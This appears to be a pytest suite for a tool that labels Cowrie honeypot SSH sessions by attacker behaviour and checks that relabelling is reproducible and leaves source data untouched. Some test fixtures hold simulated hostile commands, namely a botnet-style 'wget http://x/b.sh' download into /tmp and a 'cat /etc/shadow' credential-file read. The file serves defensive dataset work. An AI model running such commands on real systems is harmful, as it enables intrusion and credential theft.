import csv
import hashlib
import json
import subprocess
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from dataset_builder import labelling
from dataset_builder.labelling import (
    AMBIGUOUS, FAILED_LOGIN, LOGIN_NO_COMMANDS, UNASSIGNED, label_sessions,
)


REPO_ROOT = Path(__file__).resolve().parents[1]
RELABEL = REPO_ROOT / "dataset_builder" / "relabel_run.py"
BUILDER = REPO_ROOT / "dataset_builder" / "build_labelled_dataset.py"
EVAL_V1 = REPO_ROOT / "dataset_builder" / "runs" / "eval_v1"
T0 = datetime(2026, 10, 24, 17, 0, 0, tzinfo=timezone.utc)


def ts(seconds):
    return (T0 + timedelta(seconds=seconds)).isoformat().replace("+00:00", "Z")


def session(sid, start, outcome, username, password, commands=()):
    events = [{"eventid": "cowrie.session.connect", "session": sid, "timestamp": ts(start),
               "src_ip": "172.19.0.1", "src_port": 40000, "dst_ip": "172.19.0.2", "dst_port": 2222,
               "protocol": "ssh"}]
    events.append({"eventid": f"cowrie.login.{outcome}", "session": sid, "username": username,
                   "password": password, "timestamp": ts(start + 0.1)})
    for k, command in enumerate(commands):
        events.append({"eventid": "cowrie.command.input", "session": sid, "input": command,
                       "timestamp": ts(start + 0.2 + 0.1 * k)})
    events.append({"eventid": "cowrie.session.closed", "session": sid, "timestamp": ts(start + 0.9)})
    return events


def entry(index, cat, start, end, attempts, commands, label=1):
    return {"index": index, "profile": f"{cat}_profile", "attack_cat": cat, "label": label,
            "auth_attempts": [list(a) for a in attempts], "auth_success": True,
            "commands_sent": list(commands), "start_utc": ts(start), "end_utc": ts(end),
            "status": "ok", "error": None}


# --- behaviour labels -----------------------------------------------------------------------------

def test_failed_login_only_session_gets_failed_login():
    entries = [entry(1, "reconnaissance", 0, 5, [("scan", "123456"), ("root", "admin")], ["whoami", "uname -a"])]
    sessions = {"f1": session("f1", 0.5, "failed", "scan", "123456"),
                "s1": session("s1", 2.0, "success", "root", "admin", ["whoami", "uname -a"])}
    records, _ = label_sessions(sessions, entries, min_block=1)
    assert records["f1"]["behaviour_label"] == FAILED_LOGIN
    assert records["f1"]["label"] == -1
    assert records["f1"]["source_status"] == "assigned"
    assert records["f1"]["source_attack_cat"] == "reconnaissance"
    assert records["s1"]["behaviour_label"] == "reconnaissance"
    assert records["s1"]["label"] == 1


@pytest.mark.parametrize("category", ["exfiltration", "botnet", "reconnaissance", "brute_force", "benign"])
def test_failed_login_session_never_gets_a_profile_label(category):
    entries = [entry(1, category, 0, 5, [("scan", "admin"), ("scan", "root"), ("root", "x")], ["ls"])]
    sessions = {"f1": session("f1", 0.2, "failed", "scan", "admin"),
                "f2": session("f2", 0.8, "failed", "scan", "root"),
                "s1": session("s1", 2.0, "success", "root", "x", ["ls"])}
    records, _ = label_sessions(sessions, entries)
    for sid in ("f1", "f2"):
        assert records[sid]["behaviour_label"] == FAILED_LOGIN
        assert records[sid]["source_attack_cat"] == category  # provenance kept as metadata only


def test_successful_login_without_commands_is_not_given_a_profile_label():
    entries = [entry(1, "brute_force", 0, 5, [("scan", "admin"), ("pi", "raspberry")], [])]
    sessions = {"f1": session("f1", 0.2, "failed", "scan", "admin"),
                "s1": session("s1", 1.0, "success", "pi", "raspberry", ["exit"])}
    records, _ = label_sessions(sessions, entries, min_block=1)
    assert records["s1"]["behaviour_label"] == LOGIN_NO_COMMANDS
    assert records["s1"]["source_attack_cat"] == "brute_force"


def test_unique_command_match_is_labelled_with_its_category():
    entries = [entry(1, "botnet", 0, 4, [("root", "admin")], ["cd /tmp", "wget http://x/b.sh"]),
               entry(2, "benign", 5, 9, [("admin", "Welcome@123")], ["uptime", "df -h"], label=0)]
    sessions = {"a": session("a", 1, "success", "root", "admin", ["cd /tmp", "wget http://x/b.sh"]),
                "b": session("b", 6, "success", "admin", "Welcome@123", ["uptime", "df -h"])}
    records, report = label_sessions(sessions, entries, min_block=1)
    assert (records["a"]["behaviour_label"], records["a"]["label"]) == ("botnet", 1)
    assert (records["b"]["behaviour_label"], records["b"]["label"]) == ("benign", 0)
    assert report["source_assignment"]["confidently_assigned"] == 2


def test_version1_first_entry_tie_bug_is_corrected():
    # Version 1 gave a brute-force session whose only command is `whoami` the label of the first
    # entry that ever sent `whoami` (reconnaissance). Attempt-sequence alignment uses the real source.
    entries = [entry(1, "reconnaissance", 0, 4, [("root", "admin")], ["whoami", "uname -a"]),
               entry(2, "brute_force", 5, 9, [("scan", "123456"), ("scan", "admin"), ("pi", "oracle")], ["whoami"])]
    sessions = {"r": session("r", 1, "success", "root", "admin", ["whoami", "uname -a"]),
                "f1": session("f1", 5.5, "failed", "scan", "123456"),
                "f2": session("f2", 6.0, "failed", "scan", "admin"),
                "b": session("b", 7.0, "success", "pi", "oracle", ["whoami"])}
    records, report = label_sessions(sessions, entries, previous_labels={"b": "reconnaissance"})
    assert records["b"]["behaviour_label"] == "brute_force"
    assert records["b"]["overlap_tie"] is True
    assert report["command_overlap_ties"]["sessions_with_tie"] == 1
    assert report["command_overlap_ties"]["resolved"] == 1
    assert report["command_overlap_ties"]["unresolved"] == 0


# --- fallback resolution when alignment is not trusted ------------------------------------------

def _twin_entries(cat_a, cat_b, gap):
    """Two entries with identical credentials and commands, `gap` seconds apart."""
    return [entry(1, cat_a, 0, 3, [("root", "admin")], ["whoami"]),
            entry(2, cat_b, 3 + gap, 6 + gap, [("root", "admin")], ["whoami"])]


def test_equal_candidates_resolved_by_time_window_when_unambiguous():
    entries = _twin_entries("reconnaissance", "brute_force", gap=100)
    sessions = {"x": session("x", 1, "success", "root", "admin", ["whoami"]),
                "y": session("y", 104, "success", "root", "admin", ["whoami"])}
    records, report = label_sessions(sessions, entries, min_block=100, clock_tolerance=5)
    assert records["x"]["assignment_method"] == "time_window"
    assert records["x"]["behaviour_label"] == "reconnaissance"
    assert records["y"]["behaviour_label"] == "brute_force"
    assert report["time_based_assignments"] == 2


def test_equal_candidates_without_reliable_evidence_are_ambiguous():
    entries = _twin_entries("reconnaissance", "brute_force", gap=0.1)
    sessions = {"x": session("x", 3.05, "success", "root", "admin", ["whoami"])}
    records, report = label_sessions(sessions, entries, min_block=100, clock_tolerance=5)
    assert records["x"]["source_status"] == "ambiguous"
    assert records["x"]["behaviour_label"] == AMBIGUOUS
    assert records["x"]["label"] == -1
    assert records["x"]["source_attack_cat"] == ""
    assert report["source_assignment"]["ambiguous"] == 1
    assert report["behaviour_labels_ambiguous"] == 1


def test_ambiguous_source_with_unanimous_category_keeps_category():
    entries = _twin_entries("reconnaissance", "reconnaissance", gap=0.1)
    sessions = {"x": session("x", 3.05, "success", "root", "admin", ["whoami"])}
    records, _ = label_sessions(sessions, entries, min_block=100, clock_tolerance=5)
    assert records["x"]["source_status"] == "ambiguous"
    assert records["x"]["behaviour_label"] == "reconnaissance"


def test_failed_login_at_clock_boundary_is_not_forced_to_an_entry():
    entries = [entry(1, "benign", 0, 2, [("scan", "admin"), ("admin", "x")], ["uptime"], label=0),
               entry(2, "botnet", 2.1, 4, [("scan", "admin"), ("root", "y")], ["cd /tmp"])]
    sessions = {"f": session("f", 2.05, "failed", "scan", "admin")}
    records, report = label_sessions(sessions, entries, min_block=100, clock_tolerance=5)
    assert records["f"]["behaviour_label"] == FAILED_LOGIN
    assert records["f"]["source_status"] == "ambiguous"
    assert records["f"]["source_attack_cat"] == ""
    assert report["time_based_assignments"] == 0


# --- manifest password sequences ------------------------------------------------------------------

def _three_entry_run():
    entries = [entry(1, "benign", 0, 5, [("scan", "123456"), ("scan", "admin"), ("admin", "a")], ["uptime"], label=0),
               entry(2, "botnet", 6, 11, [("scan", "root"), ("root", "b")], ["cd /tmp"]),
               entry(3, "reconnaissance", 12, 17, [("scan", "password"), ("scan", "admin"), ("user", "c")], ["id"])]
    sessions = {"e1f1": session("e1f1", 0.5, "failed", "scan", "123456"),
                "e1f2": session("e1f2", 1.0, "failed", "scan", "admin"),
                "e1s": session("e1s", 2.0, "success", "admin", "a", ["uptime"]),
                "e2f1": session("e2f1", 6.5, "failed", "scan", "root"),
                "e2s": session("e2s", 7.0, "success", "root", "b", ["cd /tmp"]),
                "e3f1": session("e3f1", 12.5, "failed", "scan", "password"),
                "e3f2": session("e3f2", 13.0, "failed", "scan", "admin"),
                "e3s": session("e3s", 14.0, "success", "user", "c", ["id"])}
    return entries, sessions


def test_failed_sessions_follow_the_manifest_password_sequence():
    entries, sessions = _three_entry_run()
    records, report = label_sessions(sessions, entries)
    expected = {"e1f1": 1, "e1f2": 1, "e1s": 1, "e2f1": 2, "e2s": 2, "e3f1": 3, "e3f2": 3, "e3s": 3}
    assert {sid: r["source_index"] for sid, r in records.items()} == expected
    assert all(r["assignment_method"] == "sequence_alignment" for r in records.values())
    assert report["alignment"]["sessions_in_trusted_blocks"] == 8


def test_unexpected_session_is_unassigned_and_neighbours_stay_aligned():
    entries, sessions = _three_entry_run()
    sessions["stray"] = session("stray", 6.2, "failed", "scan", "not-in-manifest")
    records, report = label_sessions(sessions, entries)
    assert records["stray"]["behaviour_label"] == FAILED_LOGIN
    assert records["stray"]["source_status"] == "unassigned"
    assert records["e2f1"]["source_index"] == 2
    assert report["source_assignment"]["unassigned"] == 1
    assert report["missing_or_inconsistent_source_evidence"] == 1


def test_commands_not_sent_by_source_entry_are_inconsistent():
    entries = [entry(1, "botnet", 0, 4, [("root", "admin")], ["cd /tmp"])]
    sessions = {"s": session("s", 1, "success", "root", "admin", ["cat /etc/shadow"])}
    records, report = label_sessions(sessions, entries, min_block=1)
    assert records["s"]["source_status"] == "inconsistent"
    assert records["s"]["behaviour_label"] == UNASSIGNED
    assert report["source_assignment"]["inconsistent_source_evidence"] == 1
    assert report["behaviour_labels_unassigned"] == 1


def test_report_counts_and_distributions():
    entries, sessions = _three_entry_run()
    sessions["stray"] = session("stray", 6.2, "failed", "scan", "not-in-manifest")
    previous = {sid: "benign" for sid in sessions}
    records, report = label_sessions(sessions, entries, previous_labels=previous)
    assert report["sessions_total"] == 9
    assert report["failed_login_sessions"] == 6
    assert report["command_bearing_sessions"] == 3
    assert report["source_assignment"]["confidently_assigned"] == 8
    assert report["source_assignment"]["unassigned"] == 1
    assert report["label_distribution_before"] == {"benign": 9}
    assert report["label_distribution_after"] == {"benign": 1, "botnet": 1, "failed_login": 6, "reconnaissance": 1}
    assert report["label_transitions"]["benign -> failed_login"] == 6
    assert sum(report["label_distribution_after"].values()) == len(records)


# --- command-line tool: non-destructive and reproducible -------------------------------------------

def _write_run(run_dir):
    entries, sessions = _three_entry_run()
    run_dir.mkdir(parents=True)
    (run_dir / "parsed").mkdir()
    (run_dir / "labelled").mkdir()
    (run_dir / "manifest.jsonl").write_text("".join(json.dumps(e) + "\n" for e in entries), encoding="utf-8")
    (run_dir / "run_meta.json").write_text(json.dumps({"seed": 1}), encoding="utf-8")
    (run_dir / "parsed" / "sessions.json").write_text(json.dumps(sessions), encoding="utf-8")
    v1 = {sid: [dict(ev, attack_cat="benign", label=0) for ev in evs] for sid, evs in sessions.items()}
    (run_dir / "labelled" / "sessions_labelled.json").write_text(json.dumps(v1), encoding="utf-8")


def _hashes(directory):
    return {p.relative_to(directory).as_posix(): hashlib.sha256(p.read_bytes()).hexdigest()
            for p in sorted(directory.rglob("*")) if p.is_file()}


def _relabel(source, out):
    return subprocess.run([sys.executable, str(RELABEL), "--source-run", str(source), "--output-dir", str(out)],
                          cwd=REPO_ROOT, capture_output=True, text=True, timeout=600, check=False)


def test_relabel_cli_leaves_source_unchanged_and_writes_outputs(tmp_path):
    source = tmp_path / "train_v1"
    _write_run(source)
    before = _hashes(source)
    result = _relabel(source, tmp_path / "train_v2_corrected")
    assert result.returncode == 0, result.stderr
    assert _hashes(source) == before
    out = tmp_path / "train_v2_corrected"
    for name in ("sessions_labelled.json", "behavior_features.csv", "session_details.json", "label_assignments.csv",
                 "label_report.json", "comparison_report.md", "provenance.json", "manifest.jsonl", "run_meta.json"):
        assert (out / name).is_file(), name
    with open(out / "behavior_features.csv", encoding="utf-8", newline="") as handle:
        rows = {r["session_id"]: r for r in csv.DictReader(handle)}
    assert rows["e1f1"]["attack_cat"] == "failed_login"
    assert rows["e2s"]["attack_cat"] == "botnet"
    provenance = json.loads((out / "provenance.json").read_text(encoding="utf-8"))
    assert provenance["input_sha256"]["manifest.jsonl"] == before["manifest.jsonl"]


def test_relabel_cli_refuses_existing_or_nested_output(tmp_path):
    source = tmp_path / "eval_v1"
    _write_run(source)
    existing = tmp_path / "already_there"
    existing.mkdir()
    assert _relabel(source, existing).returncode != 0
    assert _relabel(source, source / "corrected").returncode != 0
    assert not (source / "corrected").exists()


def test_relabel_cli_is_reproducible(tmp_path):
    source = tmp_path / "train_v1"
    _write_run(source)
    assert _relabel(source, tmp_path / "out_a").returncode == 0
    assert _relabel(source, tmp_path / "out_b").returncode == 0
    assert _hashes(tmp_path / "out_a") == _hashes(tmp_path / "out_b")


def test_builder_refuses_to_overwrite_a_built_run(tmp_path):
    source = tmp_path / "run"
    _write_run(source)
    (source / "raw").mkdir()
    (source / "raw" / "cowrie.json").write_text("{}\n", encoding="utf-8")
    before = _hashes(source)
    result = subprocess.run([sys.executable, str(BUILDER), "--output-dir", str(source),
                             "--raw-input", str(source / "raw" / "cowrie.json")],
                            cwd=REPO_ROOT, capture_output=True, text=True, timeout=120, check=False)
    assert result.returncode != 0
    assert "Refusing to overwrite" in result.stderr
    assert _hashes(source) == before


# --- the real eval_v1 run (skipped when the local data is absent) ----------------------------------

@pytest.mark.skipif(not (EVAL_V1 / "manifest.jsonl").is_file(), reason="dataset_builder/runs/eval_v1 not present")
def test_eval_v1_relabel_matches_observed_behaviour(tmp_path):
    before = _hashes(EVAL_V1)
    out = tmp_path / "eval_v2_corrected"
    result = _relabel(EVAL_V1, out)
    assert result.returncode == 0, result.stderr
    assert _hashes(EVAL_V1) == before

    sessions = json.loads((out / "sessions_labelled.json").read_text(encoding="utf-8"))
    entries = [json.loads(line) for line in (out / "manifest.jsonl").read_text(encoding="utf-8").splitlines() if line]
    by_index = {e["index"]: e for e in entries}
    with open(out / "label_assignments.csv", encoding="utf-8", newline="") as handle:
        assignments = {r["session_id"]: r for r in csv.DictReader(handle)}
    assert len(sessions) == len(assignments) == 1232

    for sid, events in sessions.items():
        ids = {e["eventid"] for e in events}
        commands = {(e.get("input") or "").strip() for e in events if e["eventid"] == "cowrie.command.input"} - {"", "exit"}
        rec = assignments[sid]
        if "cowrie.login.success" not in ids and "cowrie.login.failed" in ids:
            assert rec["behaviour_label"] == FAILED_LOGIN
        elif not commands:
            assert rec["behaviour_label"] in (LOGIN_NO_COMMANDS, UNASSIGNED)
        elif rec["behaviour_label"] not in (AMBIGUOUS, UNASSIGNED) and rec["source_status"] == "assigned":
            assert commands <= set(by_index[int(rec["source_index"])]["commands_sent"])
            assert rec["behaviour_label"] == by_index[int(rec["source_index"])]["attack_cat"]
